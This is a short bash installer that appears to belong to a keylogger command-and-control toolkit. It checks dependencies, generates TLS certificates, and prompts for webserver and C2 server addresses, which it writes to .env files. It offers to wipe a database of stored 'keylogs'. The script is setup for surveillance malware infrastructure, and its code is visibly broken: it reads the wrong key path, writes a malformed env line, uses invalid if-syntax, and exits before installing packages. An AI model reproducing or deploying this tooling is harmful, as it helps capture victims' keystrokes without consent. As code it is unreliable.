#!/bin/bash

base64=`which base64`
openssl=`which openssl`
npm=`which npm`

#base64 check
if [ -f $base64 ]; then
echo "base64 Check Ok"
else
echo "Install base64"
exit
fi

#openssl check
if [ -f $openssl ]; then
echo "openssl Check Ok"
else
echo "Install openssl"
exit
fi

#npm check
if [ -f $npm ]; then
echo "npm Check Ok"
else
echo "Install npm: sudo apt install npm nodejs"
exit
fi

#install certs
echo "Install certs"
rm -rf certs/server.key
rm -rf certs/server.pem
openssl ecparam -genkey -name prime256v1 -out certs/server.key
openssl req -new -x509 -key server.key -out certs/server.pem -days 3650

# Set Env file
echo "Setting environment variables"
echo "Note: Webserver and C2 server can't be on the same port and must be an unused port\n"
rm -rf .env
rm -rf Web/client/.env
touch .env
read -sp "Enter WEBSERVER IP: " webserverip
echo ""
read -sp "Enter WEBSERVER PORT: " webserverport
echo ""
read -sp "Enter C2SERVER IP: " c2serverip
echo ""
read -sp "Enter C2SERVER PORT: " c2serverport
echo ""
encpubkey=`base64 -w 0 certs/server.pem`

# server env
echo "WEBSERVER_IP=$webserverip" >> .env
echo "WEBSERVER_PORT=$webserverport" >> .env
echo "C2SERVER_IP=$c2serverip" >> .env
echo "C2SERVER_PORT=$c2serverport" >> .env
echo "PUBLIC_KEY==$encpubkey" >> .env

#webclient env
echo "REACT_APP_WEBSERVER_IP=$webserverip" >> Web/client/.env
echo "REACT_APP_WEBSERVER_PORT=$webserverport" >> Web/client/.env

read -sp "Do you want to reset the database (this will clear any keylogs) (y/n): " resetchoice

if $resetchoice == 'y'; then
rm -rf data/sqlite-database.db
echo "Database Wiped!"
else
echo "Good Choice"
exit
fi

# npm install

cd client && npm install && cd ../


echo "Run './build/server' to start the C2 Server"
echo "Run './build/webserver' to start the Web Server"
echo "Run 'cd client && npm start' to start the Web Client"
